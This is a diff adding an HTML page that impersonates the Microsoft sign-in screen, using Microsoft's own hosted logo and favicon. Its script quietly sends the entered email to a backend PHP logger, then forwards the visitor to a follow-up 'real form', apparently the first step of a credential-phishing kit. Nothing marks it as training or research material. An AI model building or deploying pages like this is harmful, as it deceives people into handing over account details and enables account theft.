@@ -1,0 +1,117 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>Sign in to your account</title>
+  <link rel="icon" href="https://aadcdn.msftauth.net/shared/1.0/content/images/favicon_a_eupayfgghqiai7k9sol6lg2.ico">
+  <style>
+    body {
+      margin: 0;
+      font-family: "Segoe UI", sans-serif;
+      background: radial-gradient(circle at 20% 20%, #e8e8e8, #d2dbe8);
+    }
+
+    .login-container {
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+    }
+
+    .login-box {
+      background: white;
+      width: 380px;
+      padding: 40px 30px;
+      box-shadow: 0 0 15px rgba(0,0,0,0.1);
+      border-radius: 4px;
+    }
+
+    .logo {
+      width: 108px;
+      height: auto;
+      margin-bottom: 20px;
+    }
+
+    h1 {
+      font-size: 24px;
+      font-weight: 400;
+      margin-bottom: 10px;
+    }
+
+    label {
+      display: block;
+      font-size: 14px;
+      margin-top: 20px;
+    }
+
+    input[type="email"] {
+      width: 100%;
+      padding: 10px;
+      font-size: 16px;
+      margin-top: 6px;
+      border: none;
+      border-bottom: 1px solid gray;
+      outline: none;
+    }
+
+    .links {
+      margin-top: 12px;
+      font-size: 12px;
+    }
+
+    .links a {
+      color: #0067b8;
+      text-decoration: none;
+      margin-right: 10px;
+    }
+
+    .btn {
+      margin-top: 30px;
+      background-color: #0067b8;
+      color: white;
+      border: none;
+      padding: 10px 0;
+      width: 100%;
+      font-size: 16px;
+      cursor: pointer;
+    }
+
+    .btn:hover {
+      background-color: #005a9e;
+    }
+  </style>
+</head>
+<body>
+  <div class="login-container">
+    <div class="login-box">
+      <img class="logo" src="https://aadcdn.msftauth.net/shared/1.0/content/images/microsoft_logo_564db913a7fa0ca42727161c6d031bef.svg" alt="Microsoft">
+      <h1>Sign in</h1>
+      <form id="loginForm">
+        <input type="email" id="correo" name="correo" required placeholder="Email, phone, or Skype">
+        <div class="links">
+          <a href="#">No account? Create one!</a><br>
+          <a href="#">Can’t access your account?</a>
+        </div>
+        <button type="submit" class="btn">Next</button>
+      </form>
+    </div>
+  </div>
+
+  <script>
+    document.getElementById("loginForm").addEventListener("submit", function(e) {
+      e.preventDefault();
+      const correo = document.getElementById("correo").value;
+
+      // Enviar a tu backend para registrar el acceso
+      fetch("registrar_acceso.php", {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({ usuario: correo })
+      });
+
+      // Redirigir al formulario real
+      window.location.href = "index.html?usuario=" + encodeURIComponent(correo);
+    });
+  </script>
+</body>
+</html>
